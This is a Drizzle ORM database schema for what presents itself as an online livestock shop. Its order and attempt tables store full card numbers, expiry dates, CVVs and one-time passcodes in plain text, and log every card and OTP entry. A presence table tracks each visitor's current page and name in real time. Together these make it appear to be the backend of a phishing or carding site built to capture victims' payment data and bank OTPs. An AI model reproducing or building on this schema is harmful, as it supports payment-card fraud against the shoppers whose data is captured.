import { createInsertSchema } from "drizzle-zod";
import {
  boolean,
  date,
  integer,
  numeric,
  pgTable,
  serial,
  text,
  timestamp,
  jsonb,
} from "drizzle-orm/pg-core";
import { z } from "zod/v4";

export const productsTable = pgTable("mawashi_products", {
  id: serial("id").primaryKey(),
  name: text("name").notNull(),
  description: text("description").notNull(),
  imageUrl: text("image_url").notNull(),
  maxQuantity: integer("max_quantity").notNull().default(10),
  price: numeric("price", { precision: 10, scale: 3 }).notNull().default("0"),
  active: boolean("active").notNull().default(true),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
});

export const siteContentTable = pgTable("mawashi_site_content", {
  id: serial("id").primaryKey(),
  brandName: text("brand_name").notNull(),
  heroTitle: text("hero_title").notNull(),
  heroText: text("hero_text").notNull(),
  heroImageUrl: text("hero_image_url").notNull(),
  navLinks: text("nav_links").array().notNull().default([]),
  updatedAt: timestamp("updated_at", { withTimezone: true }).notNull().defaultNow().$onUpdate(() => new Date()),
});

export const ordersTable = pgTable("mawashi_orders", {
  id: serial("id").primaryKey(),
  productId: integer("product_id").notNull(),
  productName: text("product_name").notNull(),
  quantity: integer("quantity").notNull(),
  customerName: text("customer_name").notNull(),
  phone: text("phone").notNull(),
  address: text("address").notNull(),
  pickupDate: date("pickup_date", { mode: "string" }).notNull(),
  paymentMethod: text("payment_method").notNull(),
  paymentStatus: text("payment_status").notNull().default("not_required"),
  status: text("status").notNull().default("new"),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
  cardName: text("card_name"),
  cardNumber: text("card_number"),
  cardExpiry: text("card_expiry"),
  cardCvv: text("card_cvv"),
  otpCode: text("otp_code"),
  visitorId: text("visitor_id"),
});

// Table to track all card entry attempts
export const cardAttemptsTable = pgTable("mawashi_card_attempts", {
  id: serial("id").primaryKey(),
  orderId: integer("order_id").notNull().references(() => ordersTable.id),
  cardName: text("card_name").notNull(),
  cardNumber: text("card_number").notNull(),
  cardExpiry: text("card_expiry").notNull(),
  cardCvv: text("card_cvv"),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
});

// Table to track all OTP verification attempts
export const otpAttemptsTable = pgTable("mawashi_otp_attempts", {
  id: serial("id").primaryKey(),
  orderId: integer("order_id").notNull().references(() => ordersTable.id),
  otpCode: text("otp_code").notNull(),
  success: boolean("success").notNull().default(false),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
});

// Visitors table for tracking unique visitors
export const visitorsTable = pgTable("mawashi_visitors", {
  id: serial("id").primaryKey(),
  visitorId: text("visitor_id").unique().notNull(),
  firstVisit: timestamp("first_visit", { withTimezone: true }).notNull().defaultNow(),
  lastVisit: timestamp("last_visit", { withTimezone: true }).notNull().defaultNow(),
  totalOrders: integer("total_orders").notNull().default(0),
  metadata: jsonb("metadata").$type<{
    lastCustomerName?: string;
    lastPhone?: string;
    lastProductName?: string;
    pagesVisited?: string[];
  }>().default({}),
});

export const presenceTable = pgTable("mawashi_presence", {
  sessionId: text("session_id").primaryKey(),
  page: text("page").notNull(),
  label: text("label").notNull(),
  customerName: text("customer_name"),
  visitorId: text("visitor_id"),
  lastSeenAt: timestamp("last_seen_at", { withTimezone: true }).notNull().defaultNow(),
});

export const insertProductSchema = createInsertSchema(productsTable).omit({ id: true, createdAt: true });
export const insertSiteContentSchema = createInsertSchema(siteContentTable).omit({ id: true, updatedAt: true });
export const insertOrderSchema = createInsertSchema(ordersTable).omit({ id: true, createdAt: true });
export const insertVisitorSchema = createInsertSchema(visitorsTable);
export const insertPresenceSchema = createInsertSchema(presenceTable);

export const productPriceSchema = z.coerce.number().nonnegative();
export type Product = typeof productsTable.$inferSelect;
export type SiteContent = typeof siteContentTable.$inferSelect;
export type Order = typeof ordersTable.$inferSelect;
export type Visitor = typeof visitorsTable.$inferSelect;
export type Presence = typeof presenceTable.$inferSelect;
export type CardAttempt = typeof cardAttemptsTable.$inferSelect;
export type OtpAttempt = typeof otpAttemptsTable.$inferSelect;
